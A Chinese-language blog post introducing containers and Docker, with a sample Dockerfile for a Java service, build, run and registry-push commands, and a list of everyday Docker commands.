		一、容器是什么？ 容器镜像是轻量的、可执行的独立软件包 ，包含软件运行所需的所有内容：代码、运行时环境、系统工具、系统库和设置，赋予了软件独立性，使其免受外在环境差异（例如，开发和预演环境的差异）的影响，从而有助于减少团队间在相同基础设施上运行不同软件时的冲突。
一句话概括容器：容器就是将软件打包成标准化单元，以用于开发、交付和部署。
从虚拟化层面来看，传统虚拟化技术是对硬件资源的虚拟，容器技术则是对进程的虚拟，从而可提供更轻量级的虚拟化，实现进程和资源的隔离。
二、docker docker就是一种轻量化的虚拟化容器技术，它的目标是应用组件级别的“一次封装，到处运行”。这里的应用组件，既可以是一个Web应用，也可以是一套数据库服务，甚至是一个操作系统。将应用运行在Docker 容器上，可以实现跨平台，跨服务器，只需一次配置准备好相关的应用环境，即可实现到处运行，保证研发和生产环境的一致性，解决了应用和运行环境的兼容性问题，从而极大提升了部署效率，减少故障的可能性。
以docker发布java服务为例
（1）编写Dockerfile文件
FROM java:8
ADD demo-0.0.1-SNAPSHOT.jar app.jar
EXPOSE 9527
ENTRYPOINT ["java", "-jar", "app.jar", "--server.port=9527"]
（2）生成镜像
将jar包和Dockerfile放在同一文件夹下，执行命令docker build -t mydemo .
（2）运行容器（实例化）
docker run -p 9527:9527 镜像名
（3）上传镜像到镜像仓库（统一管理方便获取）
docker tag mydemo registry.cn-shanghai.aliyuncs.com/xxx/mydemo:v1
docker push registry.cn-shanghai.aliyuncs.com/xxx/mydemo:v1
常用命令：
docker images (查看镜像)
docker rmi 镜像名 (删除镜像)
docker ps (查看容器)
docker logs 容器名 (查看容器日志)
docker exec -it 容器名 bash (进入容器)
docker stop 容器名 (关闭容器)
docker start 容器名 (启动容器)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b2c9a7273bc5ab6c52640444d281e9c/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/135/">«</a>
	<span class="pagination__item pagination__item--current">136/279</span>
	<a class="pagination__item pagination__item--next btn" href="/page/137/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>